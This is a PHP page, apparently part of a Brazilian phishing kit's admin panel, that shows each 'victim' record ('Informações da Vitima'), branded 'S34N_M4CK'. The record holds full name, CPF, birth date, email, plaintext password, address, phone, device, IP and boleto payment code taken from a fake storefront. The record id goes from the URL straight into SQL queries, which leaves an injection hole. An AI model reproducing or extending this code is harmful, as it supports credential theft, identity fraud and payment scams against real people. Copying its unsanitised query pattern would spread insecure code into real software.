<?php include('cabecalho.php');
include('../conexao.php');
$id = $_GET['id'];
$query = "SELECT * FROM `informacoes` where id = {$id}";
$resultado = mysqli_query($conexao, $query);
//Capturando Dados Da Informação
while($exibe = mysqli_fetch_assoc($resultado)){
//Buscando Informações Do Produto
    $queryproduto = "select * from produtos where id = {$exibe['idproduto']}";
    $resultadoproduto = mysqli_query($conexao, $queryproduto);
    while($produto = mysqli_fetch_assoc($resultadoproduto)){
        $nomeproduto = $produto['nome'];
    }
    //Informações Pessoais
    $nome = $exibe['nomecompleto'];
    $cpf = $exibe['cpf'];
    $nascimento = $exibe['nascimento'];
    $email = $exibe['email'];
    $senha = $exibe['senha'];
    $cep = $exibe['cep'];
    $endereco = $exibe['endereco'];
    $numero = $exibe['numero'];
    $complemento = $exibe['complemento'];
    $bairro = $exibe['bairro'];
    $cidade = $exibe['cidade'];
    $estado = $exibe['estado'];
    $telefone = $exibe['telefone'];
    $dispositivo = $exibe['dist'];
    $ip = $exibe['ip'];
    //Informações De Pagamento
    $numeroleto = $exibe['codigoboleto'];
    $nproduto = $nomeproduto;
};

?>
<div class="col-md-12">
    <div class="card">
        <div class="card-header bg-light">Informações</div>
        <div class="card-body">

            <table class="table table-bordered">
                <thead>
                <tr>
                    <th width="15%">S34N_M4CK</th>
                    <th width="85%">Informações da Vitima</th>
                </tr>
                </thead>
                <tbody>

                <tr>
                    <td>Nome:</td>
                    <td><?=$nome?></td>
                </tr>
                <tr>
                    <td>CPF:</td>
                    <td><?=$cpf?></td>
                </tr>
                <tr>
                    <td>Nascimento:</td>
                    <td><?=$nascimento?></td>
                </tr>
                <tr>
                    <td>Email:</td>
                    <td><?=$email?></td>
                </tr>
                <tr>
                    <td>Senha:</td>
                    <td><?=$senha?></td>
                </tr>
                <tr>
                    <td>CEP:</td>
                    <td><?=$cep?></td>
                </tr>
                <tr>
                    <td>Endereço:</td>
                    <td><?=$endereco?></td>
                </tr>
                <tr>
                    <td>Numero:</td>
                    <td><?=$numero?></td>
                </tr>
                <tr>
                    <td>Complemento:</td>
                    <td><?=$complemento?></td>
                </tr>
                <tr>
                    <td>Bairro:</td>
                    <td><?=$bairro?></td>
                </tr>
                <tr>
                    <td>Cidade:</td>
                    <td><?=$cidade?></td>
                </tr>
                <tr>
                    <td>Estado:</td>
                    <td><?=$estado?></td>
                </tr>
                <tr>
                    <td>Telefone:</td>
                    <td><?=$telefone?></td>
                </tr>
                <tr>
                    <td>Dispositivo:</td>
                    <td><?=$dispositivo?></td>
                </tr>
                <tr>
                    <td>IP:</td>
                    <td><?=$ip?></td>
                </tr>
                <tr>
                    <th width="15%">S34N_M4CK</th>
                    <th width="85%">Informações de Pagamento</th>
                </tr>
                <tr>
                    <td>Codigo Leto:</td>
                    <td><?=$numeroleto?></td>
                </tr>
                <tr>
                    <td>Produto:</td>
                    <td><?=$nproduto?></td>
                </tr>
                </tbody>
            </table>

        </div>
    </div>
</div>
<?php include('rodape.php');?>